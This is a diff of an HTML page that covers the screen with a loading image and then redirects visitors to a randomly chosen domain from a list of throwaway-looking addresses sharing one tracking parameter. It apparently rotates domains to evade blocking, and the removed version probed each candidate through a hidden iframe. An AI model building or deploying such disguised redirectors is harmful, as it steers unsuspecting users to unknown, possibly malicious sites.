@@ -9,19 +9,19 @@
             margin: 0;
             padding: 0;
             height: 100%;
-            overflow: hidden; 
+            overflow: hidden;
         }
         #loadingImage {
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%; 
+            width: 100%;
             height: 100%;
-            object-fit: cover; 
-            z-index: 999; 
+            object-fit: cover;
+            z-index: 999;
         }
         #testFrame {
-            display: none; 
+            display: none;
         }
     </style>
 </head>
@@ -29,68 +29,36 @@
 
     <img id="loadingImage" src="start_page.png" alt="Loading...">
 
-    <iframe id="testFrame"></iframe>
-
     <script>
         const urls = [
-            "https://c1n9xk.ink?f=1857856",
-            "https://c3j5nv.ink?f=1857856",
+            "https://2qk7np.buzz?f=1857856",
+            "https://r4u9q5.ink?f=1857856",
+            "https://v5b3z8.ink?f=1857856",
+            "https://s1d6m9.ink?f=1857856",
+            "https://y8g2h4.ink?f=1857856",
+            "https://t3a7n9.ink?f=1857856",
+            "https://k5o1f6.ink?f=1857856",
+            "https://z9s3x7.ink?f=1857856",
+            "https://e6t2w4.ink?f=1857856",
+            "https://q7w4l1.ink?f=1857856",
+            "https://j4n9f8.ink?f=1857856",
+            "https://7pz9lm.icu?f=1857856",
+            "https://7tq8lw.buzz?f=1857856",
+            "https://7vg6lm.buzz?f=1857856",
             "https://7vj2lp.lat?f=1857856",
-            "https://l1d4ms.lat?f=1857856",
-            "https://d8f3zq.lat?f=1857856",
-            "https://h6z4mp.lat?f=1857856",
-            "https://u888u8.pro?f=1857856",
-            "https://wyav78as2.i3hy9.vip?f=1857856",
-            "https://u83kh1vn879.go5ni.vip?f=1857856",
-            "https://xx73nw2egui.ag9tn.vip?f=1857856",
-            "https://def23.vip?f=1857856",
-            "https://ghi56.vip?f=1857856",
-            "https://www.r1n7u.vip?f=1857856",
-            "https://www.mno89.vip?f=1857856"
         ];
 
-        const testFrame = document.getElementById('testFrame');
         const loadingImage = document.getElementById('loadingImage');
-        const timeoutDuration = 5000;
-        let checkedUrls = new Set();
-        function checkRandomUrl() {
-            if (checkedUrls.size === urls.length) {
-                loadingImage.style.display = 'none';
-                console.log('No accessible URLs found.');
-                return;
-            }
 
-            let randomIndex;
-            do {
-                randomIndex = Math.floor(Math.random() * urls.length);
-            } while (checkedUrls.has(randomIndex));
-
-            const url = urls[randomIndex];
-            checkedUrls.add(randomIndex);
-
-            console.log(`Checking: ${url}`);
-
-            let loadTimeout = setTimeout(() => {
-                console.error(`Timeout loading ${url}`);
-                checkRandomUrl();
-            }, timeoutDuration);
-
-            testFrame.onload = function() {
-                clearTimeout(loadTimeout); 
-                loadingImage.style.display = 'none';
-                window.location.href = url;
-            };
-
-            testFrame.onerror = function() {
-                clearTimeout(loadTimeout);
-                console.error(`Failed to load ${url}`);
-                checkRandomUrl();
-            };
-
-            testFrame.src = url;    
+        function getRandomUrl() {
+          const randomIndex = Math.floor(Math.random() * urls.length);
+          const selectedUrl = urls[randomIndex];
+          return selectedUrl;
         }
-
-        checkRandomUrl();
+        const randomUrl = getRandomUrl();
+        loadingImage.style.display = 'none';
+        window.location.href = randomUrl;
+        
     </script>
 
 </body>
